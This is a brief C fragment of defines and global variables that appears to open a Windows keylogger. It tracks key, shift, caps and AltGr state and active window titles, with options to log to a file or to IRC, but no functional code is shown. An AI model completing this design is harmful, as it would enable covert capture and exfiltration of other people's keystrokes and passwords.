#define LOG_FILE 0x1
#define LOG_IRC 0x2

int key_state;
short shift_state, caps_state, altgr_state;
char charbuf[32], buf[256], current_title[256], last_title[256];
HWND current_win, last_win;
char* current_char;
